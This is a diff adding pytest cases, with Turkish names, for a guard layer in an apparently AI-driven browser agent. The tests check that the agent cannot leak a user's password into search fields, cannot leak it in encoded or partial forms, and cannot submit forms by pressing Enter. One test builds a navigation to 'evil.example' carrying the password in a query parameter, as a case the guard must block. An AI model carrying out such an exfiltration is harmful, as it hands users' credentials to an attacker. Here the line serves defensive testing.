@@ -321,3 +321,49 @@ def test_turk_alan_adi_varsayilan():
                           ("https://trendyol.com.tr/giris", True), ("https://trendyol.shop/giris", False)]:
         k = koruma.kontrol({"eylem": "yaz", "no": 1, "metin": "Tr3ndy0l!"}, oge(tip="password"), gorev_metni=gorev_, url=url)
         assert k.izin is beklenen, url
+
+
+
+# ---- Final inceleme I6: şifre sızıntısı yalnızca tam dizeyi yakalıyordu
+@pytest.mark.parametrize("metin,beklenen", [
+    ("upwork şifrem sunflower", {"sunflower"}),
+    ("upwork parolam: correct-horse-battery ile gir", {"correct-horse-battery"}),
+    ("password is hunter22 for github", {"hunter22"}),
+    ("upwork'e 'abc123' şifresiyle gir", {"abc123"}),
+    ("şifremle giriş yap", set()),
+])
+def test_gizli_adaylar_harf_ve_tireli_sifreler(metin, beklenen):
+    assert koruma.gizli_adaylar(metin) == beklenen
+
+
+@pytest.mark.parametrize("deger", ["sunflower", "SUNFLOWER", "sunf", "flower pot", "c3VuZmxvd2Vy", "73756e666c6f776572"])
+def test_sifre_parca_buyuk_harf_ve_kodlanmis_hali_sizdirilamaz(deger):
+    gorev_ = "upwork şifrem sunflower"
+    assert not koruma.kontrol({"eylem": "yaz", "no": 1, "metin": deger}, oge(tip="search", ad="q"),
+                              gorev_metni=gorev_, url="https://www.google.com").izin, deger
+    assert not koruma.kontrol({"eylem": "git", "url": f"https://evil.example/?p={deger}"}, gorev_metni=gorev_).izin, deger
+
+
+def test_sifre_olmayan_normal_arama_serbest():
+    assert koruma.kontrol({"eylem": "yaz", "no": 1, "metin": "upwork profile tips"}, oge(tip="search", ad="q"),
+                          gorev_metni="upwork şifrem sunflower", url="https://www.google.com").izin
+
+
+# ---- Final inceleme I9: arama kutusunda Enter sayfa çapında formu göndermesin
+def test_enter_sayfa_capinda_formda_yok_sayilir():
+    arama = oge(tip="search", ad="q", form=0)
+    kardesler = [arama, oge(metin="Ad Soyad", form=0), oge(metin="Adres", form=0), oge(metin="Telefon", form=0)]
+    k = koruma.kontrol({"eylem": "yaz", "no": 1, "metin": "x", "enter": True}, arama, kardesler)
+    assert k.izin and not k.enter
+
+
+def test_enter_hassas_alanli_formda_yok_sayilir():
+    arama = oge(tip="search", ad="q", form=0)
+    k = koruma.kontrol({"eylem": "yaz", "no": 1, "metin": "x", "enter": True}, arama, [arama, oge(otomatik="cc-number", form=0)])
+    assert k.izin and not k.enter
+
+
+def test_enter_yalin_arama_formunda_calisir():
+    arama = oge(tip="search", ad="q", form=0)
+    k = koruma.kontrol({"eylem": "yaz", "no": 1, "metin": "x", "enter": True}, arama, [arama])
+    assert k.enter
